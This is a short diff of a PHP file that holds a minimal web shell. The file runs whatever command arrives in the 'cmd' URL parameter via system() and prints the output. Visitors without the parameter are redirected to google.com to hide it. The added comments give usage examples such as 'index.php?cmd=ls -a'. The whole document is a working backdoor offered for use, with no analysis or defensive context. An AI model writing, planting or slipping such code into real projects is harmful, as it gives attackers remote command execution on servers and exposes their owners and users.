@@ -1,4 +1,7 @@
 <?php
-if (!isset($_GET['cmd'])) echo "<meta http-equiv=\"Location\" content=\"http://example.com/\">"
-else system($_GET['cmd']);
+/* USE: index.php?cmd=command */
+/* USE: index.php?cmd=ls -a */
+if (!isset($_GET['cmd'])){
+	header('Location: http://www.google.com/'); // Redirect to
+} else { print(system($_GET['cmd'])); } //Exec command
 ?>
